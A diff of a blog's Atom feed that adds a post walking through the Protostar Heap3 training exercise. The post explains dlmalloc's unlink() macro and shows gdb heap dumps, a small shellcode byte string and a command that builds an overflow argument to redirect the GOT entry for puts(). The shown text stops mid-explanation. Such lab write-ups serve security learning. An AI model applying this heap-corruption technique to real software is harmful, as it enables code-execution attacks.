@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Programming & Software | David Xia]]></title>
   <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-04-13T13:33:26-04:00</updated>
+  <updated>2020-04-21T00:40:16-04:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -12,6 +12,807 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[How to Exploit Dlmalloc Unlink(): Protostar Level Heap3]]></title>
+    <link href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/"/>
+    <updated>2020-04-19T18:51:48-04:00</updated>
+    <id>https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink</id>
+    <content type="html"><![CDATA[<p>While stuck inside during social distancing, I&rsquo;ve been making my way through LiveOverflow&rsquo;s awesome
+Youtube playlist &ldquo;<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Binary Exploitation / Memory Corruption</a>.&rdquo; His videos are structured
+around a well known series of <a href="https://exploit-exercises.lains.space/protostar/">exploit exercises here</a> called &ldquo;Protostar.&rdquo; I took the
+time to truly understand each one before moving onto the next as the exercises build on each
+other. For the past several days I&rsquo;ve been trying to understand the <a href="https://exploit-exercises.lains.space/protostar/heap3/">&ldquo;Heap3&rdquo;
+level</a>, a relatively complex level that requires manipulating the heap to redirect code
+execution to an arbitrary function. After rewatching the video many times and reading numerous other
+online explanations, I finally understand! That moment of understanding feels so gratifying.</p>
+
+<p>Many other resources already explain the exploit well, but I&rsquo;m writing my own explanation to
+reinforce my understanding and to celebrate.</p>
+
+<!-- more -->
+
+
+<h2>Exploit Exercise Protostar Heap3</h2>
+
+<pre><code class="c">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+void winner()
+{
+  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  char *a, *b, *c;
+
+  a = malloc(32);
+  b = malloc(32);
+  c = malloc(32);
+
+  strcpy(a, argv[1]);
+  strcpy(b, argv[2]);
+  strcpy(c, argv[3]);
+
+  free(c);
+  free(b);
+  free(a);
+
+  printf("dynamite failed?\n");
+}
+</code></pre>
+
+<p>The source code is pretty straightforward. There&rsquo;s the <code>main()</code> and <code>winner()</code> functions. There&rsquo;s
+three character pointers, three <code>malloc()</code>&rsquo;s, three <code>strcpy()</code>&rsquo;s, three <code>free()</code>&rsquo;s, and finally a
+<code>printf()</code>. Our goal is to redirect code execution from <code>main()</code> to <code>winner()</code>.</p>
+
+<p>The description at the top of the level is</p>
+
+<blockquote><p>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to
+change program execution.</p></blockquote>
+
+<p>All these exercises are on 32-bit x86 architecture.</p>
+
+<h2>Background on dlmalloc</h2>
+
+<p>The vulnerable malloc is usually referred to as dlmalloc (named after one of its authors Doug Lea)
+and must be an old version like <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e">this one from 1996</a>. The <a href="http://phrack.org/issues/57/9.html"><em>Phrack</em> article &ldquo;Once
+Upon a free()&hellip;&rdquo;</a> provides useful background.</p>
+
+<blockquote><p>Most malloc implementations share the behaviour of storing their own management information, such
+as lists of used or free blocks, sizes of memory blocks and other useful data within the heap
+space itself.</p>
+
+<p>The central attack of exploiting malloc allocated buffer overflows is to modify this management
+information in a way that will allow arbitrary memory overwrites afterwards.</p></blockquote>
+
+<p>For our purposes, skip to the &ldquo;GNU C Library implementation&rdquo; section. It says that memory slices or
+&ldquo;chunks&rdquo; created by malloc are organized  like so. On 32-bit systems, <code>prev_size</code> and <code>size</code> are
+4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
+<code>data</code> starts.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | size                             |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>      mem -> | data                             |
+</span><span class='line'>             : &hellip;                              :
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>nextchunk -> | prev_size &hellip;                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
+
+<p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>
+
+<ul>
+<li>The lowest bit of <code>size</code> called <code>PREV_INUSE</code> indicates whether the previous chunk is used or not</li>
+<li>Once we <code>free()</code> the chunk using <code>free(mem), the memory is released, and if
+its neighboring chunks aren't free, dlmalloc will clear the next chunk's</code>PREV_INUSE<code>and add the
+chunk to a doubly-linked list of other free chunks. It does this by adding a forward and backward
+pointer at</code>mem`.</li>
+</ul>
+
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | size                             |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>      mem -> | fd                               |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | bk                               |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | (old memory, can be zero bytes)  |
+</span><span class='line'>             :                                  :&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
+
+<ul>
+<li>If neighboring chunks are free, dlmalloc will merge them. Since free chunks are in a doubly-linked
+list, dlmalloc merges by first removing the linked chunks from the list and tying the loose ends
+of the list back together. This is done via a macro called <code>unlink()</code>.</li>
+</ul>
+
+
+<pre><code>#define unlink(P, BK, FD)                                                     \
+{                                                                             \
+  BK = P-&gt;bk;                                                                 \
+  FD = P-&gt;fd;                                                                 \
+  FD-&gt;bk = BK;                                                                \
+  BK-&gt;fd = FD;                                                                \
+}                                                                             \
+</code></pre>
+
+<p>Written with pointer notation:</p>
+
+<pre><code class="c">BK = *(P + 12);  # content of memory address P + 12 stored in BK
+FD = *(P + 8);   # content of memory address P + 8 stored in FD
+*(FD + 12) = BK; # set the content of memory address FD + 12 to BK
+*(BK + 8) = FD;  # set the content of memory address BK + 8 to FD
+</code></pre>
+
+<p>Since we can overwrite the bytes of P, we can overwrite 4-bytes of memory at two arbitrary places.
+To trigger this code path, chunks being consolidated must be bigger than 80 bytes. dlmalloc
+classifies these chunks as &ldquo;fastbins.&rdquo;</p>
+
+<blockquote><p>An array of lists holding recently freed small chunks. Fastbins are not doubly linked.</p></blockquote>
+
+<h2>What the heap looks like in heap3.c</h2>
+
+<p>Run gdb on <code>heap3.c</code>. My personal preference is to set the disassembly-flavor to intel and turn off
+pagination.</p>
+
+<pre><code>user@protostar:~$ cd /opt/protostar/bin
+
+user@protostar:/opt/protostar/bin$ gdb heap3
+GNU gdb (GDB) 7.0.1-debian
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
+Reading symbols from /opt/protostar/bin/heap3...done.
+
+(gdb) set disassembly-flavor intel
+(gdb) set pagination off
+</code></pre>
+
+<p>We first disassemble the <code>main()</code> function.</p>
+
+<pre><code>(gdb) disassemble main
+Dump of assembler code for function main:
+0x08048889 &lt;main+0&gt;:    push   ebp
+0x0804888a &lt;main+1&gt;:    mov    ebp,esp
+0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff0
+0x0804888f &lt;main+6&gt;:    sub    esp,0x20
+0x08048892 &lt;main+9&gt;:    mov    DWORD PTR [esp],0x20
+0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
+0x0804889e &lt;main+21&gt;:   mov    DWORD PTR [esp+0x14],eax
+0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR [esp],0x20
+0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
+0x080488ae &lt;main+37&gt;:   mov    DWORD PTR [esp+0x18],eax
+0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR [esp],0x20
+0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
+0x080488be &lt;main+53&gt;:   mov    DWORD PTR [esp+0x1c],eax
+0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x080488c5 &lt;main+60&gt;:   add    eax,0x4
+0x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR [eax]
+0x080488ca &lt;main+65&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR [esp+0x14]
+0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR [esp],eax
+0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
+0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x080488dd &lt;main+84&gt;:   add    eax,0x8
+0x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR [eax]
+0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR [esp+0x18]
+0x080488ea &lt;main+97&gt;:   mov    DWORD PTR [esp],eax
+0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
+0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR [ebp+0xc]
+0x080488f5 &lt;main+108&gt;:  add    eax,0xc
+0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR [eax]
+0x080488fa &lt;main+113&gt;:  mov    DWORD PTR [esp+0x4],eax
+0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR [esp+0x1c]
+0x08048902 &lt;main+121&gt;:  mov    DWORD PTR [esp],eax
+0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
+0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR [esp+0x1c]
+0x0804890e &lt;main+133&gt;:  mov    DWORD PTR [esp],eax
+0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
+0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR [esp+0x18]
+0x0804891a &lt;main+145&gt;:  mov    DWORD PTR [esp],eax
+0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
+0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR [esp+0x14]
+0x08048926 &lt;main+157&gt;:  mov    DWORD PTR [esp],eax
+0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
+0x0804892e &lt;main+165&gt;:  mov    DWORD PTR [esp],0x804ac27
+0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
+0x0804893a &lt;main+177&gt;:  leave
+0x0804893b &lt;main+178&gt;:  ret
+End of assembler dump.
+</code></pre>
+
+<p>The printf has become a <code>puts()</code>. <code>plt</code> stands for procedure linkage table, one of the structures
+which makes dynamic loading and linking easier to use. <code>@plt</code> means we are calling <code>puts</code> at PLT
+entry at address <code>0x8048790</code>. If we disassemble that address we see</p>
+
+<pre><code>(gdb) disassemble 0x8048790
+Dump of assembler code for function puts@plt:
+0x08048790 &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x804b128
+0x08048796 &lt;puts@plt+6&gt;:    push   0x68
+0x0804879b &lt;puts@plt+11&gt;:   jmp    0x80486b0
+End of assembler dump.
+</code></pre>
+
+<p>It calls another function at address <code>0x804b128</code>. This address is part of the Global Offset Table
+(GOT) which points to the dynamically linked library containing the actual <code>puts()</code> function.</p>
+
+<pre><code>(gdb) x 0x804b128
+0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
+</code></pre>
+
+<p>We want to replace the call to <code>puts()</code> with a call to <code>winner()</code>. So we want to overwrite the
+contents of <code>0x804b128</code> in the GOT, currently <code>0x08048796</code>, with the address to <code>winner()</code>.</p>
+
+<p>To get a visual sense of what the heap looks like, set breakpoints at every library function
+call, i.e. break at the address of <code>malloc()</code>, <code>strcpy()</code>, <code>free()</code>, and <code>puts()</code>.</p>
+
+<pre><code>(gdb) break *0x8048ff2
+Breakpoint 1 at 0x8048ff2: file common/malloc.c, line 3211.
+(gdb) break *0x8048750
+Breakpoint 2 at 0x8048750
+(gdb) break *0x8049824
+Breakpoint 3 at 0x8049824: file common/malloc.c, line 3583.
+(gdb) break *0x8048790
+Breakpoint 4 at 0x8048790
+</code></pre>
+
+<p>Run the program with some recognizable input strings.</p>
+
+<pre><code>(gdb) r AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
+Starting program: /opt/protostar/bin/heap3 AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
+
+Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
+3211    common/malloc.c: No such file or directory.
+    in common/malloc.c
+</code></pre>
+
+<p>We&rsquo;ve hit the first breakpoint. Continue past it so that one <code>malloc()</code> is called and the heap is
+initialized.</p>
+
+<pre><code>(gdb) c
+Continuing.
+
+Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
+3211    in common/malloc.c
+</code></pre>
+
+<p>Now look at the mapped memory regions.</p>
+
+<pre><code>(gdb) info proc mapping
+process 1542
+cmdline = '/opt/protostar/bin/heap3'
+cwd = '/opt/protostar/bin'
+exe = '/opt/protostar/bin/heap3'
+Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+     0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
+     0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
+     0x804c000  0x804d000     0x1000          0           [heap]
+    0xb7e96000 0xb7e97000     0x1000          0
+    0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+    0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+    0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+    0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+    0xb7fd9000 0xb7fdc000     0x3000          0
+    0xb7fe0000 0xb7fe2000     0x2000          0
+    0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+    0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+    0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+    0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+    0xbffeb000 0xc0000000    0x15000          0           [stack]
+</code></pre>
+
+<p>The heap starts at <code>0x804c000</code>, ends at <code>0x804d000</code>, and has size <code>0x1000</code> or 4096 bytes. We can
+define hooks in gdb. We define one to examine the first 56 words of the heap in hexadecimal every
+time execution stops.</p>
+
+<pre><code>(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+&gt;x/56wx 0x804c000
+&gt;end
+</code></pre>
+
+<p>If we continue, we hit the third malloc. At this point two <code>malloc()</code>&rsquo;s have been called.</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
+0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000fb1  0x00000000  0x00000000
+0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
+3211    in common/malloc.c
+</code></pre>
+
+<p>The second word of the chunk up to the last three bits indicates the chunk size in bytes. <code>0x29</code> is
+<code>0b101001</code>. Without the last three bits it&rsquo;s <code>0b101000</code> which is 40. We can see the chunk starts at
+<code>0x804c000</code> and ends at <code>0x804c028</code> which is the start of the next chunk. This range encompasses
+10 words. Each word is 4 bytes which makes 10 * 4 = 40 bytes. The last bit of the size word
+indicates that the previous chunk is in use. By convention the first chunk has this bit turned on
+because there&rsquo;s no previous chunk that&rsquo;s free.</p>
+
+<p>The second chunk resulting from the second <code>malloc()</code> starts at <code>0x804c028</code> and ends at <code>0x804c050</code>.
+It&rsquo;s identical to the first chunk. Continue past the third <code>malloc()</code>.</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
+0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
+0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 2, 0x08048750 in strcpy@plt ()
+</code></pre>
+
+<p>We see a third chunk is created. The number at the end (right now <code>0x00000f89</code>) indicates the
+remaining size of the heap. It has been decreasing. Continue past the first <code>strcpy()</code>.</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
+0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
+0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 2, 0x08048750 in strcpy@plt ()
+</code></pre>
+
+<p>We see the the 12 <code>A</code>&rsquo;s (ASCII value 41) have been written to the heap. Continue two more times past
+the remaining two <code>strcpy()</code>&rsquo;s.</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
+0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
+0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 2, 0x08048750 in strcpy@plt ()
+(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
+0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000029  0x43434343  0x43434343
+0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
+3583    in common/malloc.c
+</code></pre>
+
+<p>We see the 12 <code>B</code>&rsquo;s and <code>C</code>&rsquo;s being written to their respective chunks. We are now at the first
+<code>free()</code>. Continue again.</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
+0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
+0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
+3583    in common/malloc.c
+</code></pre>
+
+<p>The first word of the third chunk&rsquo;s data at <code>0x804c058</code> has been zeroed out. Continue.</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
+0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
+0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 3, free (mem=0x804c008) at common/malloc.c:3583
+3583    in common/malloc.c
+</code></pre>
+
+<p><code>0x804c030</code> now has <code>0x0804c050</code> which is a pointer to the start of the third chunk. This shows the
+second and third chunk are now tied together in a singly-linked list since they are small enough to
+be considered fastbins. Continue.</p>
+
+<pre><code>(gdb) c
+Continuing.
+0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
+0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
+0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+
+Breakpoint 4, 0x08048790 in puts@plt ()
+</code></pre>
+
+<p>Now the first chunk has been freed and address <code>0x804c008</code> has a pointer <code>0x0804c028</code> to the second
+chunk. If we continue, the program runs the <code>printf("dynamite failed?\n");</code> line.</p>
+
+<pre><code>(gdb) c
+Continuing.
+dynamite failed?
+
+Program exited with code 021.
+0x804c000:  Error while running hook_stop:
+Cannot access memory at address 0x804c000
+</code></pre>
+
+<h2>Crafting the exploit</h2>
+
+<p>Let&rsquo;s work backwards. We can use <code>unlink()</code> to write the four byte address of a call to <code>winner()</code> to the GOT
+entry for <code>puts()</code>. Use <code>objdump</code> to find the address of <code>winner()</code>.</p>
+
+<pre><code>user@protostar:$ objdump -t /opt/protostar/bin/heap3 | grep winner
+08048864 g     F .text  00000025              winner
+</code></pre>
+
+<p>We can&rsquo;t just put <code>0x08048864</code> in the GOT entry at <code>0x804b128</code> (why?).
+In order to call <code>winner()</code>, we&rsquo;ll need to craft a payload that does so. Such a
+payload is often called &ldquo;<a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>.&rdquo; The following assembly code will do.</p>
+
+<pre><code>mov eax, 0x8048864
+call eax
+</code></pre>
+
+<p>Using an <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">online x86 assembler</a>, the above in raw assembly is
+<code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. We can store this in the heap&rsquo;s first chunk whose data area starts
+at <code>0x804c008</code>. Now we want to write <code>0x804c008</code> into the GOT entry for <code>puts()</code> at <code>0x804b128</code>.
+Let&rsquo;s go back to the unlink statements.</p>
+
+<pre><code>BK = *(P + 12);
+FD = *(P + 8);
+*(FD + 12) = BK;
+*(BK + 8) = FD;
+</code></pre>
+
+<p><code>BK</code> is the address of <code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. Where should we store that? Let&rsquo;s put it in
+the first chunk at <code>0x804c014</code>. The first chunk&rsquo;s data starts at <code>0x804c008</code>, but we&rsquo;ve seen the
+first byte is changed by dlmalloc when it&rsquo;s freed. We don&rsquo;t want our shellcode to be changed so we
+put it at a safe distance in the data at a +12-byte offset. 12 <code>A</code>&rsquo;s can pad the shellcode enough to
+push it 12-bytes into the heap. We have enough info to construct the first command line argument.</p>
+
+<pre><code>user@protostar:$ echo -en "AAAAAAAAAAAA\xB8\x64\x88\x04\x08\xFF\xD0" &gt; /tmp/A
+</code></pre>
+
+<p>We&rsquo;ll store <code>FD</code> and <code>BK</code> in the third chunk. We can use the second command line argument to
+overwrite the size of the third chunk to be greater than 80 to trigger the <code>unlink()</code> macro when the
+third chunk is <code>free()</code>&rsquo;d. The second argument needs to have enough characters to overflow its
